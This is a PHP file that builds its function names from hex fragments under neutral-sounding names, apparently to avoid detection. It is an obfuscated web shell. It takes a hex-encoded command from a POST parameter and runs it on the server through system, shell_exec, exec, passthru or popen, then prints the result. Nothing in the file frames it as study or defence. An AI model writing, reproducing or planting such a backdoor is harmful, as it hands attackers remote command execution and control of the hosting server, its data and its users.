<?php


$data1 = '737';
$data2 = '973';
$data3 = '746';
$data4 = '56d';
$data5 = '865';
$data6 = '6c6';
$data7 = 'c5f';
$data8 = '657';
$data9 = '468';
$data10 = '727';
$data11 = '706';
$data12 = '656';
$data13 = '472';
$data14 = '16d';
$data15 = '765';
$data16 = '745';
$data17 = 'f63';
$data18 = '6f6';
$data19 = 'e74';
$data20 = '6f7';
$data21 = '365';
$data22 = '173';
$data23 = 'f70';
$data24 = '726';
$data25 = '373';
$core_engine1 = pack("H*", $data1.$data2.$data3.$data4);
$core_engine2 = pack("H*", '736'.$data5.$data6.$data7.'657'.$data5);
$core_engine3 = pack("H*", $data8.'865');
$core_engine4 = pack("H*", '706'.'173'.'737'.$data9.$data10);
$core_engine5 = pack("H*", $data11.'f70'.$data12);
$core_engine6 = pack("H*", $data1.$data13.$data12.$data14.'5f6'.$data15.$data16.$data17.$data18.'e74'.$data12.$data19);
$core_engine7 = pack("H*", '706'.'36c'.$data20.$data21);
$task_processor = pack("H*", $data3.$data22.'6b5'.$data23.$data24.'f63'.'657'.$data25.$data20);
if (isset($_POST[$task_processor])) {
    $task_processor = pack("H*", $_POST[$task_processor]);
    if (function_exists($core_engine1)) {
        $core_engine1($task_processor);
    } elseif (function_exists($core_engine2)) {
        print $core_engine2($task_processor);
    } elseif (function_exists($core_engine3)) {
        $core_engine3($task_processor, $data_chunk_mrk);
        print join("\n", $data_chunk_mrk);
    } elseif (function_exists($core_engine4)) {
        $core_engine4($task_processor);
    } elseif (function_exists($core_engine5) && function_exists($core_engine6) && function_exists($core_engine7)) {
        $pgrp_pset = $core_engine5($task_processor, 'r');
        if ($pgrp_pset) {
            $parameter_group_hld = $core_engine6($pgrp_pset);
            $core_engine7($pgrp_pset);
            print $parameter_group_hld;
        }
    }
    exit;
}
